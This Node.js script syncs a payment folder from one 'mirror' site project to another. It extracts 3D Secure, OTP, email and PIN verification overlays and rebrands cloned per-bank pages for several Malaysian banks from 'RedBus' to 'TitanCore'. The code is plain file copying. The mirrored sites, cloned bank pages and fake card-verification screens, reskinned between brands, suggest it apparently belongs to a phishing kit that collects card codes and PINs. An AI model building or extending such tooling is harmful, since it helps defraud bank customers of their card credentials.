/**
 * Sync verification module from redbus-mirror/public/pay → titancore-mirror/public/pay
 * Also generates overlays.html + overlays.css (OTP/Email/PIN/App, no load-overlay)
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const DEFAULT_SRC = path.join(ROOT, '..', 'redbus-mirror', 'public', 'pay');
const SRC = process.env.REDBUS_PAY_SRC || DEFAULT_SRC;
const DEST = path.join(ROOT, 'public', 'pay');

const SKIP_FILES = new Set(['index.html', 'index_备份.html']);

function copyDir(src, dest, isRoot = false) {
  fs.mkdirSync(dest, { recursive: true });
  for (const name of fs.readdirSync(src)) {
    if (isRoot && SKIP_FILES.has(name)) continue;
    const s = path.join(src, name);
    const d = path.join(dest, name);
    if (fs.statSync(s).isDirectory()) copyDir(s, d, false);
    else fs.copyFileSync(s, d);
  }
}

function extractOverlays() {
  const indexPath = path.join(SRC, 'index.html');
  if (!fs.existsSync(indexPath)) throw new Error(`Missing ${indexPath}`);
  const raw = fs.readFileSync(indexPath, 'utf8');

  const styleMatch = raw.match(/<style>([\s\S]*?)<\/style>/);
  const overlayStart = raw.indexOf('<!-- 3D Secure overlay -->');
  const overlayEnd = raw.indexOf('<!-- Email Verification overlay -->');
  const emailStart = overlayEnd;
  const emailEnd = raw.indexOf('<script>', emailStart);
  if (overlayStart < 0 || emailEnd < 0) throw new Error('Could not locate overlay HTML in redbus pay/index.html');

  let overlayHtml = raw.slice(overlayStart, emailEnd);
  overlayHtml = overlayHtml.replace(/<!-- Loading overlay[\s\S]*?<!-- 3D Secure overlay -->/, '<!-- 3D Secure overlay -->');
  overlayHtml = overlayHtml.replace(/RedBus/g, 'TitanCore');

  const css = styleMatch ? styleMatch[1].trim() : '';
  fs.writeFileSync(path.join(DEST, 'overlays.css'), css, 'utf8');
  fs.writeFileSync(path.join(DEST, 'overlays.html'), overlayHtml.trim() + '\n', 'utf8');
}

if (!fs.existsSync(SRC)) {
  console.error(`Source not found: ${SRC}`);
  process.exit(1);
}

copyDir(SRC, DEST, true);
extractOverlays();

function rewriteBankMerchantNames() {
  const banks = ['AMBANK', 'CIMB', 'MALAYAN', 'OCBC', 'RHB', 'PBB', 'SCBMB'];
  for (const bank of banks) {
    const p = path.join(DEST, bank, 'index.html');
    if (!fs.existsSync(p)) continue;
    let html = fs.readFileSync(p, 'utf8');
    html = html.replace(/RedBus/gi, 'TitanCore').replace(/REDBUS/g, 'TITANCORE');
    fs.writeFileSync(p, html, 'utf8');
  }
}
rewriteBankMerchantNames();

console.log(`sync:pay OK → ${DEST}`);
console.log('  overlays.html, overlays.css generated (no load-overlay)');
